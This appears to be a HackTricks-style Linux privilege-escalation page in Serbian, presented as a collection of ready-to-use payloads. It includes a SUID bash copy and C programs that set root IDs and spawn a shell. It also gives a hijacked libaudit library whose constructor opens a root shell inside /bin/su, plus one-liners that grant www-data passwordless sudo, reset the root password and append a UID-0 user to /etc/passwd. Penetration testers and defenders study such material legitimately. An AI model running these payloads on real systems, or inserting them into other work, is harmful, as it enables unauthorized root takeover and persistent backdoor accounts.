# Payloads za izvršavanje

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` omogućava privileged mode: kada se Bash pokrene sa različitim stvarnim i efektivnim ID-ovima, ne resetuje efektivni ID na stvarni ID. Dobijeni shell i dalje zavisi od postojećih akreditiva pozivaoca.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` menja stvarne, efektivne i sačuvane ID-jeve kada je to dozvoljeno, dok `setuid` menja efektivni ID i može takođe postaviti stvarni i sačuvani ID za privilegovanog pozivaoca. `execve` zamenjuje sliku trenutnog procesa zatraženim programom.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Ovi primeri izostavljaju provere povratnih vrednosti; oba poziva za rad sa akreditivima mogu da ne uspeju čak i za UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Prepisivanje fajla radi eskalacije privilegija

### Uobičajeni fajlovi

Ovo su uobičajeni lokalni fajlovi i interfejsi za kontrolu privilegija: `/etc/passwd` čuva zapise naloga sa sedam polja, `/etc/shadow` čuva opcione šifrovane podatke o lozinkama, `sudoers` definiše sudo privilegije i tagove kao što je `NOPASSWD`, a podrazumevana endpoint adresa Docker daemon-a je Unix socket na `/var/run/docker.sock`; pristup tom socket-u može omogućiti root-level kontrolu nad hostom.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Dodajte korisnika sa lozinkom u _/etc/passwd_
- Promenite lozinku unutar _/etc/shadow_
- Dodajte korisnika u sudoers u _/etc/sudoers_
- Abuse docker kroz docker socket, obično u _/run/docker.sock_ ili _/var/run/docker.sock_

### Prepisivanje biblioteke

Proverite koje shared libraries koristi binary; u ovom primeru pregledajte `/bin/su` pomoću `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` prikazuje zavisnosti od shared-object datoteka, dok dinamički linker koristi ELF metapodatke i svoja pravila pretrage da bi ih učitao tokom izvršavanja.<sup>[[9]](#references)[[10]](#references)</sup>

Da biste pregledali jednog kandidata, koristite `objdump -T` da prikažete tabelu dinamičkih simbola programa `su` i filtrirate nazive za audit.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` i `audit_log_acct_message` su funkcije biblioteke libaudit; `audit_fd` je u ovom izlazu prikazan kao objekat podataka definisan u `.bss` od `su`.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Replacement library mora da izvozi kompatibilne definicije za nedefinisane simbole koje loader razrešava; neusklađeni function/data ABI-ji i dalje mogu da dovedu do pada procesa kada se ti simboli relokuju ili pozovu.<sup>[[10]](#references)[[11]](#references)</sup>

GCC-ov atribut `constructor` uzrokuje da se `inject` automatski pozove pre `main` na podržanim targetima.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Ako zamenu uspešno učita privilegovani proces **`/bin/su`**, ovaj konstruktor može pokrenuti **`/bin/bash`** sa privilegijama tog procesa; tačan rezultat zavisi od okruženja.<sup>[[10]](#references)[[15]](#references)</sup>

## Skripte

Možete li naterati root da nešto izvrši?

`sudoers` koristi oznaku `NOPASSWD` u stavkama pravila, `chpasswd` čita parove `user:password` sa standardnog ulaza, a `/etc/passwd` koristi sedam poljima naloga razdvojenih dvotačkama; sledeći primeri pretpostavljaju da su relevantne datoteke upisive za proces koji ih izvršava.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data u sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Promena root lozinke**
```bash
echo "root:hacked" | chpasswd
```
### Dodavanje novog root korisnika u /etc/passwd

Konačni payload zavisi od toga da li cilj prihvata generisani `crypt` hash: Debian-ov `mkpasswd -m sha-512` mapira na SHA-512 crypt (`$6$`), dok OpenSSL-ov `passwd -1 -salt` koristi MD5-based BSD algoritam (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Ugrađena komanda set (Bash Reference Manual)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Linux stranica priručnika](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Linux stranica priručnika](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Linux stranica priručnika](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Linux stranica priručnika](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian stranice priručnika](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Zaštita Docker daemon socket-a](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker dokumentacija](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Linux stranica priručnika](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian stranice priručnika](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian stranice priručnika](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian stranice priručnika](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Uobičajeni atributi (Using the GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian izvorni kod](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL dokumentacija](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
